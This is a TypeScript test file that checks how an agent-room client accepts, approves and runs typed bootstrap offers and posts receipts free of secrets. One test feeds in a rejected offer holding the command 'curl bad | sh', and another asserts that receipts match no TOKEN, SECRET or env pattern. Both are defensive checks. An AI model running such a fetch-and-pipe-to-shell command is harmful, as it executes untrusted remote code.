import { createHash } from 'node:crypto';
import { mkdtemp, mkdir, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { createLocalServer } from '../../local-server/src/server.js';
import type { BootstrapOffer } from '../src/contracts.js';
import { executeBootstrapOffer } from '../src/orchestrator.js';
import { StarterRoomTransport } from '../src/transport.js';

const running: Array<ReturnType<typeof createLocalServer>> = [];
afterEach(async () => Promise.all(running.splice(0).map((server) => server.close())));

async function roomFixture() {
  const server = createLocalServer({ dataDir: await mkdtemp(join(tmpdir(), 'starter-room-')) });
  running.push(server);
  const { port } = await server.listen();
  const baseUrl = `http://127.0.0.1:${port}`;
  const post = async (payload: object, access?: string, participant?: string) => fetch(`${baseUrl}/api/room`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      ...(access === undefined ? {} : { 'x-agent-room-access': access }),
      ...(participant === undefined ? {} : { authorization: `Bearer ${participant}` }),
    },
    body: JSON.stringify(payload),
  });
  const created = await (await post({ action: 'create', topic: 'Starter', createdBy: 'Host' })).json() as any;
  const host = await (await post({
    action: 'join',
    code: created.room.code,
    hostKey: created.hostKey,
    participant: { name: 'Host', role: 'Host', color: '#000000', initials: 'HO', client: 'cc', joinedAt: 0, lastSeenAt: 0 },
  }, created.accessToken)).json() as any;
  return { baseUrl, post, created, host };
}

describe('starter room contract', () => {
  it('joins, receives a typed offer, executes in order, and posts a non-secret receipt', async () => {
    const { baseUrl, post, created, host } = await roomFixture();
    const source = 'process.exit(0);\n';
    const checkout = await mkdtemp(join(tmpdir(), 'starter-checkout-'));
    await mkdir(join(checkout, 'scripts'));
    await writeFile(join(checkout, 'scripts', 'bootstrap-local.mjs'), source);
    const offer: BootstrapOffer = {
      kind: 'bootstrap_offer',
      repository: 'https://github.com/noogalabs/agent-room.git',
      revision: 'a'.repeat(40),
      artifactSha256: createHash('sha256').update(source).digest('hex'),
    };
    await post({
      action: 'send', code: created.room.code,
      message: { id: 1, type: 'msg', name: 'Host', initials: 'HO', color: '#000000', role: 'Host', text: JSON.stringify(offer), client: 'cc', time: 1 },
    }, created.accessToken, host.participantToken);

    const transport = new StarterRoomTransport(baseUrl, created.room.code, created.accessToken);
    const session = await transport.join({ name: 'Starter', role: 'Installer', color: '#10B981', initials: 'ST' });
    const poll = await session.pollBootstrapOffers(0);
    expect(poll.accepted).toEqual([{ accepted: true, offer }]);

    const order: string[] = [];
    const run = vi.fn(async () => { order.push('run'); return 0; });
    const receipt = await executeBootstrapOffer(offer, {
      checkout: async () => { order.push('checkout'); return checkout; },
      approve: async () => { order.push('approve'); return true; },
      run,
      sendReceipt: async (value) => { order.push('receipt'); await session.sendReceipt(value, 2); },
      now: (() => { let value = 10; return () => value++; })(),
    });

    expect(order).toEqual(['checkout', 'approve', 'run', 'receipt']);
    expect(receipt.disposition).toBe('bootstrap_completed');
    const messages = await (await post(
      { action: 'messages', code: created.room.code, cursor: 0 },
      created.accessToken,
    )).json() as any;
    // Load-bearing receipt-shape guard: do not weaken to toMatchObject. Extra
    // fields are an egress failure even when every expected field is present.
    expect(JSON.parse(messages.messages.at(-1).text)).toEqual(receipt);
    expect(messages.messages.at(-1).text).not.toMatch(/TOKEN|SECRET|stdout|stderr|env/i);
  });

  it('surfaces an invalid typed offer without executing it', async () => {
    const { baseUrl, post, created, host } = await roomFixture();
    await post({
      action: 'send', code: created.room.code,
      message: { id: 1, type: 'msg', name: 'Host', initials: 'HO', color: '#000000', role: 'Host', text: JSON.stringify({ kind: 'bootstrap_offer', command: 'curl bad | sh' }), client: 'cc', time: 1 },
    }, created.accessToken, host.participantToken);

    const session = await new StarterRoomTransport(baseUrl, created.room.code, created.accessToken)
      .join({ name: 'Starter', role: 'Installer', color: '#10B981', initials: 'ST' });
    const poll = await session.pollBootstrapOffers(0);
    expect(poll.accepted).toEqual([{
      accepted: false,
      reason: 'offer must contain only the typed bootstrap fields',
    }]);
  });
});
